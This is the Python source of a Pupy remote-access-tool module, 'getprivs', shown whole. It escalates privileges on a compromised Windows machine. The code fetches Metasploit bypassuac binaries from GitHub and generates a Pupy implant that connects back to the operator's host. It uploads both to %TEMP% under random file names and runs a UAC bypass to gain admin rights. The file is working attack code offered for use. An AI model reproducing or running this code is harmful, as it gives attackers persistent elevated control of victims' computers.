# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import pupygen
from urllib2 import urlopen
import os
import random
import string
from modules import migrate
from modules import memory_exec

__class_name__="GetPrivsModule"

class GetPrivsModule(PupyModule):
	""" try to get SeDebugPrivilege for the current process """

	#https://msdn.microsoft.com/en-us/library/windows/desktop/aa383745%28v=vs.85%29.aspx#macros_for_conditional_declarations
	#https://msdn.microsoft.com/en-us/library/windows/desktop/ms724833%28v=vs.85%29.aspx
	win_versions={}
	win_versions['WIN_10']=(10, 0, 0)
	win_versions['WIN_SERVER_2016']=(10, 0, 0)
	win_versions['WIN_8.1']=(6, 3, 0)
	win_versions['WIN_SERVER_2012_R2']=(6, 3, 0)
	win_versions['WIN_8']=(6, 2, 0)
	win_versions['WIN_SERVER_2012']=(6, 2, 0)
	win_versions['WIN_7_SP1']=(6, 1, 1)
	win_versions['WIN_7']=(6, 1, 0)
	win_versions['WIN_SERVER_2008_R2']=(6, 0, 1)
	win_versions['WIN_SERVER_2008']=(6, 0, 1)
	win_versions['WIN_VISTA_SP1']=(6, 0, 1)
	win_versions['WIN_VISTA']=(6, 0, 0)
	win_versions['WIN_SERVER_2003_SP2']=(5, 2, 2)
	win_versions['WIN_SERVER_2003_SP1']=(5, 2, 1)
	win_versions['WIN_SERVER_2003']=(5, 2, 0)
	win_versions['WIN_XP_SP3']=(5, 1, 3)
	win_versions['WIN_XP_SP2']=(5, 1, 2)
	win_versions['WIN_XP_SP1']=(5, 1, 1)
	win_versions['WIN_XP']=(5, 1, 0)

	def init_argparse(self):
		self.arg_parser=PupyArgumentParser(prog="getprivs", description=self.__doc__)
		self.arg_parser.add_argument('-e','--pupy', help='Use an alternative file')
		#self.arg_parser.add_argument('-m','--method', choices=['binary','memexec','reflective'], required=True, help='UAC bypass method')

	@windows_only
	def is_compatible(self):
		pass

	def run(self, args):
		bypass_file=["bypassuac-x64.exe","bypassuac-x86.exe","bypassuac-x64.dll","bypassuac-x86.dll"]
		for bin in bypass_file:
			if not os.path.exists(bin):
				self.error(bin + " not found...")
				bypassuac=urlopen('https://github.com/rapid7/metasploit-framework/blob/master/data/post/'+bin+'?raw=true')
				f=open(bin,'wb')
				f.write(bypassuac.read())
				f.close()

		exebuff=b""
		if args.pupy:
			with open(args.pupy,'rb') as f:
				exebuff=f.read()
			self.info("loading %s ..."%args.pupy)
		else:
			#retrieving conn info
			res=self.client.conn.modules['pupy'].get_connect_back_host()
			host, port=res.rsplit(':',1)
			#generating exe
			self.info("generating exe ...")
			if self.client.desc['proc_arch']=="64bit":
				exebuff=pupygen.get_edit_pupyx64_exe(host, port, self.client.pupsrv.transport)
			else:
				exebuff=pupygen.get_edit_pupyx86_exe(host, port, self.client.pupsrv.transport)

		self.client.load_package("pupwinutils.security", force=True)

		AdminCheck=self.client.conn.modules["pupwinutils.security"].AdminCheck()

		if AdminCheck==False:
			self.info("Not ADMIN, attempting to bypassUAC")
			try:
				#if args.method=="binary":
				if self.client.desc['proc_arch']=="64bit":
					bpuac=os.path.join(os.getcwd(),b"bypassuac-x64.exe")
				else:
					bpuac=os.path.join(os.getcwd(),b"bypassuac-x86.exe")

				with open(bpuac,'rb') as f:
					bpuacbuff=f.read()

				remote_path={'bypass':'','pupy':''}
				for k in remote_path.keys():
					remote_path[k]=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
					self.info("uploading %s to %s ..."%(k,remote_path[k]))
					#uploading
					rf=self.client.conn.builtin.open(remote_path[k], "wb")

					chunk_size=16000
					pos=0

					self.info("working %s ..."%k)
					while True:
						if k=='pupy':
							buf=exebuff[pos:pos+chunk_size]
						elif k=='bypass':
							buf=bpuacbuff[pos:pos+chunk_size]
						if not buf:
							break
						rf.write(buf)
						pos+=chunk_size
					rf.close()
					self.success("upload successful")
				print remote_path['bypass'], remote_path['pupy']
				self.client.conn.modules["pupwinutils.security"].ByPassUAC_bin(remote_path['bypass'], remote_path['pupy'])
				self.success("ADMIN stuff enabled !")

			except:
				self.error("Could not elevate privilages to ADMIN")
